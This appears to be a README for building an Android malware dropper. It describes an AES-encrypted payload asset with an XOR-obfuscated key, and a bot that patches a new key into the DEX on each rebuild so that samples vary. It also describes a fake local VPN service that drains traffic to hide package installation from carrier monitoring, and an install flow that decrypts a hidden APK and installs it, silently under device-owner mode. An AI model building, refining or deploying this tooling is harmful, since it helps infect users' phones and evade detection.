# New Dropper — Build Instructions

Package: `com.base.util.apps`  
Asset:   `assets/core.dat` (AES-256-CBC, IV prepended)  
Key:     base64(key XOR 0x55) in `MainActivity.getKey()` — 44 chars, always same length

## Requirements

- Android Studio (any recent) **or** command-line tools:
  - Android SDK Build Tools 34
  - Android SDK Platform 34 (`platforms/android-34`)
  - JDK 17+

## Build (Android Studio)

1. Open `samples/dropper/` as Android project
2. Build → Generate Signed Bundle/APK → APK → Release
3. Output: `app/build/outputs/apk/release/dropper_release.apk`
4. Copy to `samples/bot/dropper_release.apk`

## Build (command line)

```bash
cd samples/dropper
./gradlew assembleRelease
# output: app/build/outputs/apk/release/dropper_release.apk
cp app/build/outputs/apk/release/dropper_release.apk ../bot/dropper_release.apk
```

## Enable new dropper in bot

In `swapper_bot.py`, point `DROPPER_PATH` to `dropper_release.apk`:

```python
# To use new dropper: change rebuild call in handle_document to rebuild_new_dropper()
```

Or set `NEW_DROPPER_PATH` to its path and call `rebuild_new_dropper()` in `handle_document`.

## How the key patch works

Bot generates: `new_key = secrets.token_bytes(32)`  
Computes:      `xored = bytes(b ^ 0x55 for b in new_key)`  
Encodes:       `b64 = base64.b64encode(xored).decode()` → always 44 chars  
Finds the template `"t/ytp2yZiA+H4w5+GyCFzyMUazlYAdAfZA/C4kATG38="` in DEX  
Replaces in-place → no ULEB128 update needed → DEX checksums recomputed

## VPN mechanism

`VpnBypassService` creates a local TUN interface (`10.8.0.1/32`), routes all
traffic through it, and silently drains packets.  No remote server — purely
local.  Purpose: PackageInstaller.Session activity doesn't appear as a
standard TCP connection to carrier monitoring tools.

Install flow:
1. `startVpn()` → user sees Android system VPN dialog → allow
2. TUN established → `onVpnReady()`
3. Background thread: AES-decrypt `core.dat` → `files/base.apk`
4. `startInstallSession()` → PackageInstaller.Session
5. Android shows "Install?" dialog (or silent on device-owner mode)
6. On SUCCESS → cleanup temp APK, close VPN, `finish()`
